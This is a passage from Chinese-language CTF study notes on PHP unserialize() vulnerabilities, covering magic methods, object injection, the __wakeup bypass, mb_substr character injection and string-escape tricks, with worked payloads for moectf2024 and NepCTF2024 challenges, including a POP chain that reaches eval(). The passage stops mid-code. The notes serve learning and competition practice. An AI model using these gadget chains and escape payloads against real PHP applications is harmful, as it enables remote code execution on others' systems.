<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;Test&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;a&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;Hello&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;b&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>20</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=nx>对象类型</span><span class=o>:</span><span class=nx>长度</span><span class=o>:</span><span class=s2>&#34;名字&#34;</span><span class=o>:</span><span class=nx>类中变量的个数</span><span class=o>:</span><span class=p>{</span><span class=nx>类型</span><span class=o>:</span><span class=nx>长度</span><span class=o>:</span><span class=s2>&#34;名字&#34;</span><span class=p>;</span><span class=nx>类型</span><span class=o>:</span><span class=nx>长度</span><span class=o>:</span><span class=s2>&#34;值&#34;</span><span class=p>;</span><span class=o>......</span><span class=p>}</span></span></span></code></pre></div></div><p><strong>类型字母</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>a</span> <span class=o>-</span> <span class=k>array</span>                  <span class=nx>b</span> <span class=o>-</span> <span class=nx>boolean</span>  
</span></span><span class=line><span class=cl><span class=nx>d</span> <span class=o>-</span> <span class=nx>double</span>                 <span class=nx>i</span> <span class=o>-</span> <span class=nx>integer</span>
</span></span><span class=line><span class=cl><span class=nx>o</span> <span class=o>-</span> <span class=nx>common</span> <span class=nx>object</span>          <span class=nx>r</span> <span class=o>-</span> <span class=nx>reference</span>
</span></span><span class=line><span class=cl><span class=nx>s</span> <span class=o>-</span> <span class=nx>string</span>                 <span class=nx>C</span> <span class=o>-</span> <span class=nx>custom</span> <span class=nx>object</span>
</span></span><span class=line><span class=cl><span class=nx>O</span> <span class=o>-</span> <span class=k>class</span>                  <span class=nc>N</span> <span class=o>-</span> <span class=k>null</span>
</span></span><span class=line><span class=cl><span class=nx>R</span> <span class=o>-</span> <span class=nx>pointer</span> <span class=nx>reference</span>      <span class=nx>U</span> <span class=o>-</span> <span class=nx>unicode</span> <span class=nx>string</span></span></span></code></pre></div></div><p><strong>魔术方法</strong></p><p>当这些方法在某个类test中，如只有在test类中含有__invoke，某函数将对象当作函数调用触发才成功</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){}</span> <span class=c1>// 构造函数 new一个类实例对象时调用
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){}</span> <span class=c1>// 析构函数 某对象的所有引用都被删除或对象被显式销毁时执行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){}</span> <span class=c1>// 尝试将对象当作函数调用时触发
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__set</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span> <span class=nv>$b</span><span class=p>){}</span> <span class=c1>// 魔术方法: 尝试给一个不存在或不可访问的属性赋值时被调用
</span></span></span><span class=line><span class=cl><span class=c1>// $a: 属性名 $b: 值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){}</span> <span class=c1>// 当对象被当作字符串使用时调用 比如 echo一个对象
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){}</span>   <span class=c1>// 序列化字符串被反序列化时调佣
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>public</span> <span class=k>function</span> <span class=fm>__sleep</span><span class=p>(){}</span>    <span class=c1>// 对象被序列化时调用
</span></span></span></code></pre></div></div><p><strong>对象注入漏洞</strong></p><p>操作序列化的对象来执行任意代码</p><p><strong>两</strong>个条件：</p><ul><li>必须具有一个实现PHP魔术方法的类</li><li>攻击中使用的所有类都必须在调用易受攻击的<code>unserialize()</code>时声明</li></ul><p><strong>代码构造出序列化串</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Name</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>private</span> <span class=nv>$user</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>;</span> <span class=c1>// 私有字段名在序列化时，类名及字段名前会加入\0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$test</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$test</span><span class=p>));</span> 
</span></span><span class=line><span class=cl><span class=c1>// O:4:&#34;Name&#34;:1:{s:10:&#34;Nameuser&#34;;s:5:&#34;admin&#34;;}
</span></span></span><span class=line><span class=cl><span class=c1>// 构造更新: O:4:&#34;Name&#34;:1:{s:10:&#34;%00Name%user&#34;;s:5:&#34;admin&#34;;}
</span></span></span></code></pre></div></div><p><strong>绕过</strong></p><ul><li>属性个数的值大于实际属性个数时，会跳过 <code>__wakeup()</code> 函数执行</li></ul><p><strong>例题——moectf2024【pop moe】</strong></p><div class="code-block code-line-numbers" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>class000</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$payl0ad</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$what</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>check</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>payl0ad</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s1>&#39;FAILED TO ATTACK&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>what</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>class001</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$payl0ad</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>payload</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>payl0ad</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>class002</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$sec</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__set</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span> <span class=nv>$b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$b</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sec</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>dangerous</span><span class=p>(</span><span class=nv>$whaattt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$whaattt</span><span class=o>-&gt;</span><span class=na>evvval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sec</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>class003</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$mystr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>evvval</span><span class=p>(</span><span class=nv>$str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__tostring</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mystr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>构造链的过程：</p><p><code>__destruct()</code> > <code>check()</code>【payl0ad为1】 > 【what为class001】对象作为函数调用 > <code>__invoke()</code> > 【payl0ad为dangerous, a为class001】为不存在的payload赋值 > <code>__set(payload, dangerous)</code> > <code>dangerous(this->sec)</code> > 【sec为class003, 作为whaattt执行->evvval(class003)】 > 对象作为字符串 > <code>__toString()</code>返回mystr【mystr为执行的命令】 > <code>eval(mystr)</code></p><p>最终构造的<code>data</code>展开：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;class000&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>s</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;payl0ad&#34;</span><span class=p>;</span><span class=nx>i</span><span class=o>:</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;what&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;class001&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>s</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;payl0ad&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;dangerous&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;a&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;class002&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;sec&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;class003&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;mystr&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>10</span><span class=o>:</span><span class=s2>&#34;phpinfo();&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p>假设没有eval函数的情况，使用<code>system(ls)</code>命令进行RCE</p><p><strong>字符注入</strong></p><p><code>mb_strpos</code>与<code>mb_substr</code>连用导致字符注入</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>function</span> <span class=nf>substrstr</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$start</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;[&#34;</span><span class=p>);</span> <span class=c1>// 字符 &#34;[&#34; 首次出现的索引, 否则false
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$end</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>mb_substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$start</span><span class=p>,</span> <span class=nv>$end</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>-</span> <span class=nv>$start</span><span class=p>);</span><span class=c1>// 多字节字符集的子字符串提取
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>   <span class=c1>// &#39;[&#39; 开始 &#39;]&#39; 结束的所有字符
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=nx>substrstr</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;[helloJshirobro]&#34;</span><span class=p>);</span> <span class=c1>// 注入点
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nv>$key</span>
</span></span><span class=line><span class=cl><span class=c1>// ?0=%9f              start=0, end=6, key=?[hello ?是字符乱码
</span></span></span><span class=line><span class=cl><span class=c1>// ?0=%f0              start=1, end=7, key=llo]
</span></span></span><span class=line><span class=cl><span class=c1>// ?0=%9f%9f%9f%9fabcd start=4, end=10, key=abcd[he
</span></span></span><span class=line><span class=cl><span class=c1>// ?0=%f0abc%9f        start=4, end=10, key=ello] 效果类似右移(3-1)位
</span></span></span><span class=line><span class=cl><span class=c1>// %f0abc%0abc%9f:效果为右移(2*3-1)位
</span></span></span></code></pre></div></div><p><strong>任意字符串构造</strong></p><ul><li><strong><code>%9f</code>不解析，造成字符串后移一位：%9f数量等于要构造的字符串长度<code>%9f%9fab</code></strong></li><li><code>%f0</code>吞掉字符串三位: %f0加随便三个字符，结合<code>%9f</code>的后移，<code>%f0abc%9f</code>达到字符串逃逸</li></ul><p>注：<code>substrtr</code>函数逃逸出的字符不能大于原来的字符数量，此时可通过其他<code>GET</code>传入增加字符数量</p><p>payload构造：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>?</span><span class=nx>get1</span><span class=o>=</span><span class=p>(</span><span class=nx>增加字符数量</span><span class=p>,</span> <span class=nx>任意值</span><span class=p>)</span><span class=o>&amp;</span><span class=nx>read</span><span class=o>=</span><span class=p>(</span><span class=nx>n个</span><span class=o>%</span><span class=mi>9</span><span class=nx>f</span><span class=p>)(</span><span class=nx>序列化字符串</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>增长字符逃逸</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;bb&#39;</span><span class=p>,</span> <span class=s1>&#39;ccc&#39;</span><span class=p>,</span> <span class=nv>$str</span><span class=p>);</span> <span class=c1>// n个bb将会多n个字符
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;aaaabb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;123456&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$AA</span><span class=o>=</span><span class=k>new</span> <span class=nx>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=c1>// O:1:&#34;A&#34;:2:{s:4:&#34;name&#34;;s:6:&#34;aaaabb&#34;;s:4:&#34;pass&#34;;s:6:&#34;123456&#34;;} 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=c1>// O:1:&#34;A&#34;:2:{s:4:&#34;name&#34;;s:6:&#34;aaaaccc&#34;;s:4:&#34;pass&#34;;s:6:&#34;123456&#34;;}
</span></span></span><span class=line><span class=cl><span class=c1>// s 多一个字符, 但只能解析6个, 逃逸了一个c
</span></span></span></code></pre></div></div><p>通过逃逸修改pass，payload为25个字符，即前加入25个&rsquo;bb&rsquo;，每个逃逸一个字符</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#34;;s:4:&#34;pass&#34;;s:4:&#34;hack&#34;;}&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>//$name: ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
</span></span></span><span class=line><span class=cl><span class=c1>//$pass: hack       
</span></span></span></code></pre></div></div><p><strong>例题——NepCTF2024【PHP_MASTER!!】</strong></p><p>打入<code>payload</code>：URL( 47个%00, 即47个&rsquo;\0&rsquo; 增长型字符逃逸)</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>?</span><span class=nx>c</span><span class=o>=%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mo>00</span><span class=s2>&#34;;s:3:&#34;</span><span class=nx>str</span><span class=s2>&#34;;O:1:&#34;</span><span class=nx>B</span><span class=s2>&#34;:1:{s:1:&#34;</span><span class=nx>b</span><span class=s2>&#34;;s:7:&#34;</span><span class=nx>phpinfo</span><span class=s2>&#34;;}}&amp;nep1=%f0123%f0123%f0123%9f%9f%f0123&amp;nep=Nep
</span></span></span><span class=line><span class=cl><span class=s2>// &#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;str&#34;</span><span class=p>;</span><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;b&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>7</span><span class=o>:</span><span class=s2>&#34;phpinfo&#34;</span><span class=p>;}}</span> <span class=nx>长度为47</span> <span class=nx>增长逃逸47字符</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>substrstr</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$start</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;[&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$end</span> <span class=o>=</span> <span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>mb_substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$start</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=nv>$end</span> <span class=o>-</span> <span class=mi>1</span> <span class=o>-</span> <span class=nv>$start</span><span class=p>);</span> <span class=c1>// 变式
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>B</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__tostring</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/\[|\]/i&#34;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;nep&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;NONONO!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
